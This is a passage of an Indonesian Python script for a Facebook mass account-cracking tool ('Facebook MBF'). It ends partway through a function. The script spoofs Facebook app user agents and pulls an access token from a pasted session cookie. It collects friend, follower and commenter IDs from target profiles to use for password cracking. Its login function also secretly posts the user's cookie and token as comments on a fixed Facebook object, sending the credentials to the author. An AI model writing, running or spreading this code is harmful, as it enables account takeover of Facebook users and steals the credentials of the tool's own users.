###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import requests,json,os,sys,random,time,re,uuid,zlib,subprocess,base64
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from time import time as tod
from requests.exceptions import ConnectionError
from datetime import datetime
from os import system as sis
from time import time as tim
ses = requests.Session()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT BIASA ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ WARNA PRINT RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RW = str(random.choice([M2, H2, K2, B2, U2, N2, O2, J2, A2]))

###----------[ GLOBAL NAMA ]---------- ###
reset = "[/]"
loop = 0
ok = 0
cp = 0
id = []
id2 = []
akun = []
oprek = []
method = []
taplikasi = []
tokenku = []
uid = []
cokbrut = []
dump = []
uadia, uadarimu = [], []
pwlist, pwlis = [], []
pwpluss, pwnya = [], []
uasm, uaMainXD = [], []
sys.stdout.write('\x1b]2; Facebook MBF | Nazri Multi For Facebook\x07')

###----------[ HALAMAN USERAGENT ]---------- ###
for x in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	fban = random.choice(['AndroidSampleApp','TalkForAndroidNative','MobileAdsManagerAndroid','PAAA','CreatorStudioForAndroid','MessengerLite'])
	fbpn = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
	fbcr = random.choice(['INDOSAT','AXIS','XL Axiata'])
	fbmf = random.choice(['Xiaomi','Oppo','samsung','Google','Asus','Vivo'])
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-A515F Build/SP1A.{str(rr(211111,299999))}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5300,5900))}.{str(rr(79,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]"
	if ugent1 in uasm:pass
	else:uasm.append(ugent1)
	ugent2 = f"Dalvik/2.1.0 (Android {str(rr(9,12))}; L-03K Build/PKQ1.{str(rr(111111,199999))}.001) [FBAN/{fban};FBAV/{str(rr(75,150))}.0.0.2.{str(rr(75,150))};FBPN/{fbpn};FBLC/en_US;FBBV/{str(rr(222222222,299999999))};FBCR/Airtel;FBMF/LGE;FBBD/lge;FBDV/L-03K;FBSV/9;FBCA"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/{str(rr(75,150))}.0.0.15.{str(rr(73,99))};FBPN/{fbpn};FBLC/sv_SE;FBBV/{str(rr(66666666,69999999))};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920};FB_FW/1;]"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)

def ua_efbi():
    rr = random.randint
    rc = random.choice
    fbpn = str(rc(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite']))
    model = str(rc(["Mi 10 Pro","RMX2030"]))
    return (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Mi 10 Pro Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.0.0.8.106;FBPN/{fbpn};FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/{model};FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")

for xv in range(10000):
    rr = random.randint
    rc = random.choice
    fbpn = str(rc([
          "com.facebook.adsmanager",
          "com.facebook.lite",
          "com.facebook.orca",
          "com.facebook.katana",
          "com.facebook.mlite"
          ]))
    fban = str(rc([
          "AndroidSampleApp",
          "TalkForAndroidNative",
          "MobileAdsManagerAndroid",
          "PAAA","CreatorStudioForAndroid",
          "MessengerLite"
          ]))
    gt = str(rc([
          "GT-1015","GT-1020","GT-1030","GT-1035",
          "GT-1040","GT-1045","GT-1050","GT-1240",
          "GT-1440","GT-1450","GT-18190","GT-18262",
          "GT-19060I","GT-19082","GT-19083","GT-19105",
          "GT-19152","GT-19192","GT-19300","GT-19505",
          "GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP",
          "GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050",
          "GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R",
          "GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326",
          "GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81",
          "GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300",
          "GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710",
          "GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510",
          "GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150",
          "GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R",
          "GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592",
          "GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200",
          "GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210",
          "GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500"
          ]))
    sm = str(rc([
          "SM-A500F","SM-A500FU","SM-A500H",
          "SM-G532F","SM-G900F","SM-G920F",
          "SM-G930F","SM-G935","SM-G950F",
          "SM-J320F","SM-J320FN","SM-J320H",
          "SM-J320M","SM-J510FN","SM-J701F",
          "SM-N920S","SM-T111","SM-T230","SM-T231",
          "SM-T235","SM-T280","SM-T311","SM-T315",
          "SM-T525","SM-T531","SM-T535","SM-T555",
          "SM-T561","SM-T705","SM-T805","SM-T820"
          ]))
    andr = str(rc([
          "6.0.0","7.0.0",
          "8.0.0","9.0.0",
          "10.0.0","11.0.0",
          "12.0.0","5.0.1"
          ]))
    build = str(rc([
          "SAMSUNG","LMY4","LMY47V",
          "MMB29K","MMB29M","LRX22C",
          "LRX22G","NMF2","NMF26X","NMF26X;",
          "NRD90M","NRD90M;","SPH-L720","IML74K",
          "IMM76D","JDQ39","JSS15J","JZO54K","KOT4",
          "KOT49H","KOT4SM-T310","KTU84P"
          ]))
    dalvik1 = f"Dalvik/2.1.0 (Linux; U; Android {andr}; {gt} Build/{build}) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/{fbpn};FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{gt};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920};FB_FW/1;]"
    dalvik2 = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))}; INE-LX1r Build/HUAWEIINE-LX1r) [FBAN/Orca-Android;FBAV/{str(rr(200,299))}.1.0.13.{str(rr(75,150))};FBPN/{fbpn};FBLC/en_US;FBBV/151534286;FBCR/touch;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=2128};FB_FW/1;]"
    dalvik3 = f"Dalvik/2.1.0 (Linux; U; Android {andr}; {sm} Build/R16NW) [FBAN/Orca-Android;FBAV/{str(rr(100,199))}.0.0.29.{str(rr(75,99))};FBPN/{fbpn};FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/{sm};FBSV/{andr};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920};FB_FW/1;]"
    dalvikMain = str(rc([dalvik1, dalvik2, dalvik3]))
    uaMainXD.append(dalvikMain)

###----------[ CHECK WARNA TEMA ]---------- ###
try:
	color_rich = open("assets/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00FFFF]"
try:
	color_table = open("assets/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00FFFF"

###----------[ GANTI WARNA TEMA ]---------- ###
def gantiTema():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. change theme color red    [{color_rich}06{P2}]. change theme color pink
[{color_rich}02{P2}]. change theme color green  [{color_rich}07{P2}]. change theme color L blue
[{color_rich}03{P2}]. change theme color yellow [{color_rich}08{P2}]. change theme color white
[{color_rich}04{P2}]. change theme color blue   [{color_rich}09{P2}]. change theme color orange
[{color_rich}05{P2}]. change theme color violet [{color_rich}10{P2}]. change theme color gray""",width=80,padding=(0,4),style=f"{color_table}"))
	them = console.input(f" {H2}•{P2} pilih warna tema : ")
	if them in["1","01"]:
		open("assets/color_rich.txt","w").write("[#FF0000]")
		open("assets/color_table.txt","w").write("#FF0000")
	elif them in["2","02"]:
		open("assets/color_rich.txt","w").write("[#00FF00]")
		open("assets/color_table.txt","w").write("#00FF00")
	elif them in["3","03"]:
		open("assets/color_rich.txt","w").write("[#FFFF00]")
		open("assets/color_table.txt","w").write("#FFFF00")
	elif them in["4","04"]:
		open("assets/color_rich.txt","w").write("[#00C8FF]")
		open("assets/color_table.txt","w").write("#00C8FF")
	elif them in["5","05"]:
		open("assets/color_rich.txt","w").write("[#AF00FF]")
		open("assets/color_table.txt","w").write("#AF00FF")
	elif them in["6","06"]:
		open("assets/color_rich.txt","w").write("[#FF00FF]")
		open("assets/color_table.txt","w").write("#FF00FF")
	elif them in["7","07"]:
		open("assets/color_rich.txt","w").write("[#00FFFF]")
		open("assets/color_table.txt","w").write("#00FFFF")
	elif them in["8","08"]:
		open("assets/color_rich.txt","w").write("[#FFFFFF]")
		open("assets/color_table.txt","w").write("#FFFFFF")
	elif them in["9","09"]:
		open("assets/color_rich.txt","w").write("[#FF8F00]")
		open("assets/color_table.txt","w").write("#FF8F00")
	elif them in["10"]:
		open("assets/color_rich.txt","w").write("[#AAAAAA]")
		open("assets/color_table.txt","w").write("#AAAAAA")
	time.sleep(3)
	prints(Panel(f"{P2} berhasil mengganti tema nomor {color_rich}{them}{P2} silahkan jalankan ulang scriptnya",width=80,padding=(0,4),style=f"{color_table}"))
	time.sleep(3);exit()

###----------[ CEK NEGARA WAJIB INDO ]---------- ###
try:
	IP = requests.get("http://ip-api.com/json/").json()["query"]
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	if "Indonesia" not in negara:
	   prints(Panel(f"""{P2}this script only work in Indonesia, please search another script""",width=80,padding=(0,6),style=f"{color_table}"))
	   time.sleep(3);exit()
except requests.exceptions.ConnectionError:
	prints(f" {H2}•{P2} koneksi internet anda bermasalah")
	time.sleep(3);exit()

###----------[ CONVERT BULAN ]---------- ###
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"OK-{days}-{reall}-{year}.txt"
cpc = f"CP-{days}-{reall}-{year}.txt"

###----------[ DINI HARI ]---------- ###
def waktu():
        now = datetime.now()
        hours = now.hour
        if 4 <= hours < 12:timenow = "Selamat Pagi"
        elif 12 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        else:timenow = "Selamat Malam"
        return timenow

###----------[ TAHUN ]---------- ###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahun = '2009'
		elif fx[:9] in ['100000000']       :tahun = '2009'
		elif fx[:8] in ['10000000']        :tahun = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahun = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahun = '2010'
		elif fx[:6] in ['100001']          :tahun = '2010/2011'
		elif fx[:6] in ['100002','100003'] :tahun = '2011/2012'
		elif fx[:6] in ['100004']          :tahun = '2012/2013'
		elif fx[:6] in ['100005','100006'] :tahun = '2013/2014'
		elif fx[:6] in ['100007','100008'] :tahun = '2014/2015'
		elif fx[:6] in ['100009']          :tahun = '2015'
		elif fx[:5] in ['10001']           :tahun = '2015/2016'
		elif fx[:5] in ['10002']           :tahun = '2016/2017'
		elif fx[:5] in ['10003']           :tahun = '2018'
		elif fx[:5] in ['10004']           :tahun = '2019'
		elif fx[:5] in ['10005']           :tahun = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahun = '2021/2022'
		else:tahun=''
	elif len(fx) in [9,10]:
		tahun = '2008/2009'
	elif len(fx)==8:
		tahun = '2007/2008'
	elif len(fx)==7:
		tahun = '2006/2007'
	else:tahun=''
	return tahun

###----------[ LOGO ( LO GOBLOK ) ]---------- ###
def banner():
	try:os.system("clear")
	except:pass
	prints(Panel(f"""      \n      
 _______ ______  _______  {M2}██████████████████████{reset}
 |  |  | |_____] |______  {M2}██████████████████████{reset}
 |  |  | |_____] |        {P2}██████████████████████{reset}
                          {P2}██████████████████████{reset}
                                       \n""",title=f"{P2}halo, {RW}{waktu()}",subtitle=f"{P2}version 2.0.2",width=80,padding=(0,11),style=f"{color_table}"))

###----------[ LOGIN ]---------- ###
def login():
	banner()
	ses = requests.Session()
	prints(Panel(f"{P2}silahkan masukan cookie akun anda, di sarankan menggunakan akun tumbal",width=80,padding=(0,3),style=f"{color_table}"))
	cok = console.input(f" {H2}•{P2} masukan cookie : ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:
		  prints(f" {H2}•{P2} cookie kamu invalid")
		  time.sleep(00.03);exit()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('data/tokenku.txt', 'a').write(took);open('data/coki.txt', 'a').write(cok)
				ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={cok}&access_token={took}",cookies={"cookie":cok})
				ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={open('data/tokenku.txt','r').read()}&access_token={took}",cookies={"cookie":cok})
				prints(Panel(f"{H2}{cok}\n\n{N2}{took}",title=f"{P2}cookie & token",width=80,style=f"{color_table}"))
				time.sleep(3)
				prints(f" {H2}•{P2} login berhasil, silahkan jalankan ulang scriptnya")
				exit()
	except (KeyError,AttributeError):
		print(e)

###----------[ MAIN MENU ]---------- ###
def menu():
	try:
	    ses = requests.Session()
	    lisen = open('data/lisensi.txt','r').read()
	    met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzMzUzNzgyNyIsIjdCY0phZlJGRTlJZDNiQmpXM3dTaHlLd1Vic05qTU81LzM0TTJRbVIiXQ==&ProductId=18075&Key='+lisen).json()
	    men = met['licenseKey']
	    key = men['key'][0:11]
	    tahun = men['expires'][0:4]
	    buln = men['expires'][5:7]
	    tanggal = men['expires'][8:10]
	    bulan = bulan_ttl[buln]
	    tahun1 = men['created'][0:4]
	    buln1 = men['created'][5:7]
	    tanggal1 = men['created'][8:10]
	    bulan1 = bulan_ttl[buln1]
	except:
            key = "-"
            tanggal = "-"
            bulan = "-"
            tahun = "-"
            tanggal1 = "-"
            bulan1 = "-"
            tahun1 = "-"
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		prints(f" {H2}•{P2} cookie kamu invalid")
		time.sleep(3);os.system('clear')
		login()
	try:
	    sen = open("data/lisensi.txt","r").read()
	    prem = f"{H2}Ya"
	except (KeyError,FileNotFoundError):
	    prem = f"{M2}Tidak"
	try:
		ishx = ses.get(f"https://graph.facebook.com/v15.0/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = ishx["name"]
		idfb = ishx["id"]
	except requests.exceptions.ConnectionError:
		prints(f" {H2}•{P2} koneksi internet anda bermasalah")
		exit()
	except KeyError:
		try:os.remove("data/coki.txt");os.remove("data/tokenku.txt")
		except:pass
		prints(f" {H2}•{P2} akun terkena chekpoint")
		time.sleep(3);login()
	os.system('clear')
	banner()
	urut = []
	urut.append(Panel(f'{P2}nama    : {H2}{nama}\n{P2}id akun : {H2}{idfb}\n{P2}ip kamu : {H2}{IP}\n{P2}negara  : {H2}{negara}',width=40,padding=(0,2),title=f"{H2}data akun",style=f"{color_table}"))
	urut.append(Panel(f'{P2}lisensi : {H2}{key}-****-****\n{P2}join    : {H2}{tanggal1} {bulan1} {tahun1}\n{P2}expired : {H2}{tanggal} {bulan} {tahun}\n{P2}premium : {prem}',width=38,padding=(0,2),title=f"{H2}data lisensi",style=f"{color_table}"))
	console.print(Columns(urut))
	prints(Panel(f"{P2}[{color_rich}01{P2}]. crack dari id publik           {P2}[{color_rich}06{P2}]. check hasil crack\n{P2}[{color_rich}02{P2}]. crack dari id publik massal    {P2}[{color_rich}07{P2}]. ganti warna tema\n{P2}[{color_rich}03{P2}]. crack dari total pengikut      {P2}[{color_rich}08{P2}]. upgrade ke premium\n{P2}[{color_rich}04{P2}]. crack dari id like post        {P2}[{color_rich}09{P2}]. hapus lisensi premium\n{P2}[{color_rich}05{P2}]. crack dari file                {P2}[{color_rich}00{P2}]. exit ( {color_rich}hapus cookie{P2} )",width=80,padding=(0,6),style=f"{color_table}"))
	prints(Panel(f"{P2}ketik {color_rich}'crack'{P2} untuk masuk ke menu crack lainya, dan ketik {M2}keluar{P2} untuk exit",width=80,padding=(0,1),style=f"{color_table}"))
	NazriXD___ = console.input(f" {H2}•{P2} pilih menu : ")
	if NazriXD___ in [""]:
	  prints(f" {H2}•{P2} pilihan tidak boleh kosong")
	  time.sleep(3);menu()
	elif NazriXD___ in ["crack","Crack","CRACK"]:
	    boting()
	elif NazriXD___ in ["keluar","Keluar","KELUAR"]:
	    prints(f" {H2}•{P2} waiting bro...")
	    time.sleep(3);exit()
	elif NazriXD___ in ["1","01"]:
		dumpPublik()
	elif NazriXD___ in ["2","02"]:
		dumpMassal()
	elif NazriXD___ in ["3","03"]:
	    dumpPengikut()
	elif NazriXD___ in ["4","04"]:
	    dumpLikes()
	elif NazriXD___ in ["5","05"]:
	    crackFile()
	elif NazriXD___ in ["6","06"]:
	    result()
	elif NazriXD___ in ["7","07"]:
	    gantiTema()
	elif NazriXD___ in ["8","08"]:
	    upPrem()
	elif NazriXD___ in ["9","09"]:
	    os.system("rm -rf data/lisensi.txt")
	    prints(f" {H2}•{P2} berhasil menghapus lisensi tools")
	    time.sleep(3);exit()
	elif NazriXD___ in ["0","00"]:
		os.system("rm -rf data/tokenku.txt rm -rf data/coki.txt")
		prints(f" {H2}•{P2} berhasil menghapus cookie & sukses keluar")
		time.sleep(3);exit()
	else:
		prints(f" {H2}•{P2} masukan pilihan yang bener")
		time.sleep(3);menu()

###----------[ UPGRADE PREMIUM ]---------- ###
def upPrem():
    try:
        with requests.Session() as ses:
             prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp")
             os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+upgrade+sc+Facebook MBF+ke+premium+dong");exit()
    except requests.exceptions.ConnectionError:
        prints(f" {H2}•{P2} koneksi internet anda bermasalah");exit()

###----------[ MENU BOT ]---------- ###
def boting():
    prints(Panel(f"{P2}[{color_rich}01{P2}]. crack dari email        {P2}[{color_rich}04{P2}]. crack dari komentar\n{P2}[{color_rich}02{P2}]. crack dari nomor        {P2}[{color_rich}05{P2}]. report bug script\n{P2}[{color_rich}03{P2}]. crack dari search name  {P2}[{color_rich}06{P2}]. kembali ke menu",width=80,padding=(0,10),style=f"{color_table}"))
    ask = console.input(f" {H2}•{P2} menu : ")
    if ask in [""]:
      prints(f" {H2}•{P2} pilihan tidak boleh kosong")
      time.sleep(3);menu()
    elif ask in ["1","01"]:
        crackEmail()
    elif ask in ["2","02"]:
        crackNomor()
    elif ask in ["3","03"]:
        dumpSearch()
    elif ask in ["4","04"]:
        crackKomen()
    elif ask in ["5","05"]:
        prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+6281221523195");exit()
    elif ask in ["6","06"]:
        time.sleep(3)
        menu()
    else:
        prints(f" {H2}•{P2} masukan pilihan yang bener")
        time.sleep(3);menu()

###----------[ RESULT ]---------- ###
def result():
	prints(Panel(f"{P2}[{color_rich}01{P2}]. check result akun hasil OK\n{P2}[{color_rich}02{P2}]. check result akun hasil CP\n{P2}[{color_rich}03{P2}]. kembali ke menu utama",width=80,padding=(0,20),style=f"{color_table}"))
	kz = console.input(f" {H2}•{P2} pilihan result : ")
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			prints(f" {H2}•{P2} file tidak ditemukan")
			time.sleep(2)
			back()
		if len(vin)==0:
			prints(f" {H2}•{P2} anda tidak mempunyai file CP")
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					prints(f' [{color_rich}%s{P2}]. %s ( {K2}%s{P2} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					prints(f' [{color_rich}%s{P2}]. %s ({K2} %s {P2}id )'%(cih,isi,(len(hem))))
			geeh = console.input(f" {H2}•{P2} hasil result : ")
			try:geh = lol[geeh]
			except KeyError:
				prints(f" {H2}•{P2} pilih yang bener")
				time.sleep(3);menu()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				prints(f" {H2}•{P2} file tidak ditemukan")
				time.sleep(3);menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				prints(f' {P2}[{color_rich}X{P2}] {K2}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			console.input(f" {H2}•{P2} klik enter")
			time.sleep(3);menu()
	
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			prints(f" {H2}•{P2} file tidak ditemukan")
			time.sleep(3);menu()
		if len(vin)==0:
			prints(f" {H2}•{P2} anda tidak mempunyai file OK")
			time.sleep(3);menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					prints(f' [{color_rich}%s{P2}]. %s ( {H2}%s{P2} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					prints(f' [{color_rich}%s{P2}]. %s ({H2} %s {P2}id )'%(cih,isi,(len(hem))))
			geeh = console.input(f" {H2}•{P2} hasil result : ")
			try:geh = lol[geeh]
			except KeyError:
				prints(f" {H2}•{P2} pilih yang bener")
				time.sleep(3);menu()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				prints(f" {H2}•{P2} file tidak ditemukan")
				time.sleep(3);menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				prints(f' {P2}[{color_rich}✓{P2}] {H2}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print("")
			console.input(f" {H2}•{P2} klik enter")
			time.sleep(3);menu()
	
	elif kz in ['3','03']:
		time.sleep(3)
		menu()
	
	else:
		prints(f" {H2}•{P2} pilih yang bener")
		time.sleep(3);menu()

###----------[ MENU DUMP PUBLIK ]---------- ###
def dumpPublik():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		time.sleep(3)
		exit()
	ses = requests.Session()
	prints(Panel(f"{P2}ketik {color_rich}'me'{P2} jika ingin crack dari daftar teman anda sendiri",width=80,padding=(0,8),style=f"{color_table}"))
	kl = console.input(f' {H2}•{P2} masukan id target : ')
	uid.append(kl)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except KeyError:
			pass
		except requests.exceptions.ConnectionError:
			prints(f" {H2}•{P2} koneksi internet anda bermasalah")
			time.sleep(3);exit()
	print("\r")
	prints(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
	try:
		setting()
	except requests.exceptions.ConnectionError:
		prints(f" {H2}•{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		prints(f" {H2}•{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ MENU DUMP MASSAL ]---------- ###
def dumpMassal():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		time.sleep(3)
		exit()
	try:
		jum = int(console.input(f' {H2}•{P2} masukan jumlah target : '))
	except ValueError:
		prints(f" {H2}•{P2} masukan jumlah dengan benar")
		time.sleep(3);exit()
	if jum<1 or jum>999:
		prints(f" {H2}•{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()
	ses = requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = console.input(f' {H2}•{P2} masukan id ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except KeyError:
			pass
		except requests.exceptions.ConnectionError:
			prints(f" {H2}•{P2} koneksi internet anda bermasalah")
			time.sleep(3);exit()
	print("\r")
	prints(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
	try:
		setting()
	except requests.exceptions.ConnectionError:
		prints(f" {H2}•{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		prints(f" {H2}•{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ CRACK DARI KOMEN ]---------- ###
def crackKomen():
	prints(Panel(f"{P2}pastikan akun target yang di pilih bersifat publik jangan private",width=80,padding=(0,4),style=f"{color_table}"))
	ide = input(f' masukan id postingan : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		prints(f" {H2}•{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()
	setting()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:id.append(id+"|"+nama)
			sys.stdout.write(f"\r {H}•{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass					

###----------[ DUMP PENGIKUT ]---------- ###
def dumpPengikut():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	prints(Panel(f"{P2}ketik {color_rich}'me'{P2} jika ingin crack dari total followers anda sendiri",width=80,padding=(0,7),style=f"{color_table}"))
